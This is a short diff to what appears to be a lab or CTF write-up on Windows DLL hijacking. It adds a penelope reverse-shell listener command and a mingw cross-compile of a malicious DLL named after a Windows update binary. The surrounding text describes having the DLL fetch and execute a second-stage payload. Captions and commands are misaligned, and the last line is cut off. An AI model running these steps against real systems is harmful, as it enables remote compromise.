@@ -801,5 +801,17 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
 Ill modify the C code to do a wget since i know that works, then pull the second stage and output it to `C:\Temp` and then finally execute it
 
 ```python
-penelope op 
+penelope -p 1337
+```
+
+Then ill set a listener
+
+```python
+x86_64-w64-mingw32-gcc -shared poc.c -o wuaclt.dll
+```
+
+Then once again compile the new DLL
+
+```python
+pyth
 ```
